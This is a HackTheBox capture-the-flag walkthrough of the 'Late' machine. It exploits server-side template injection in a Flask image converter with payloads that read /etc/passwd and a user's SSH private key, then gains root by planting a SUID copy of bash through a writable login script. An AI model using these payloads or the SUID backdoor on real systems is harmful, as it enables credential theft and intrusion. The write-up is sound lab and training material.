## **Description**

Hello hackers, I hope you are doing well. We are doing [Late](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). We find an image converter vulnerable to ssti so we exploit that to read private ssh key or even execute commands. After that we find a shell file that runs by root every ssh login, so we  modify the file to get root access.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for late.htb (10.10.11.156)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)

```

We found 2 open ports, 22 running ssh and 80 is a nginx http web server.

### Web

Let's check the web page.

![](1.png)

It's a photo editing web site, scrolling to to bottom we find a link

![](2.png)

The link goes to `images.late.htb`, let's add that to `/etc/hosts` file and go there.

![](3.png)

Here we can convert an image to text.

I uploaded to screen shot above and got a text file called `results.txt` with the following:

```text
<p>Convert image to textunes

If you want to turn an image into a text document, you came to the right place.

Convert your image now!

Choose file Browse

</p>           
```

Since this converter uses `Flask`, let's see if it's vulnerable to SSTI.

We upload an image that has this text `\{\{7*7\}\}`, and if we get back 49 in the text file we can confirm the web site is vulnerable.

![](4.png)

```terminal
$ cat results.txt
<p>49
</p>
```

We got 49, the web site is vulnerable.

## **Foothold**

Let's read the `/etc/passwd/` file with this payload:

```python
\{\{ get\_flashed\_messages.\_\_globals\_\_.\_\_builtins\_\_.open("/etc/passwd").read() \}\}.
```

![](5.png)

```terminal
$ cat results.txt                                                                                                                                        
<p>root:x:0:0:root:/root:/bin/bash                                                                                                                            
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                               
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                          
[...]
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash     <------------
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin

</p>                                                                                           
```

We found a user called `svc_acc`, let's see if we can find an ssh private key in the user's .ssh directory using this payload:

```python
\{\{ get\_flashed\_messages.\_\_globals\_\_.\_\_builtins\_\_.open("/home/svc_acc/.ssh/id_rsa").read() \}\}
```

![](6.png)

```terminal
$ cat results.txt

```

Great! We got it, now let's ssh to the box.

```terminal
$ ssh -i id_rsa svc_acc@late.htb
svc_acc@late:~$ id
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
svc_acc@late:~$ 
```

## **Privilege Escalation**

Now we run `linpeas`

![](7.png)

We see that `/usr/local/sbin` directory is writable by us and there is a shell file there, let's check it out.

```terminal
svc_acc@late:/usr/local/sbin$ ls -la
total 12
drwxr-xr-x  2 svc_acc svc_acc 4096 May  4 11:50 .
drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
-rwxr-xr-x  1 svc_acc svc_acc  433 May  4 11:50 ssh-alert.sh
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

The first thing we notice is that we own the directory and the file. The second thing is the file has been modified in the past minute.

The shell file sends an email to root every time there is an ssh login.

To see what's happening, i'm gonna run `pspy64` and go to another window and make an ssh login.

![](8.png)

As we can see the shell file got executed when we logged in and after a little bit another cronjob run and changed to ownership of the file to `svc_acc`.

So let's add the following piece of code to `ssh-alert.sh` that's going to make a copy of /bin/bash and give it suid bit.

```terminal
cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
```

![](9.png)

The suid bash been created successfully and we got root.
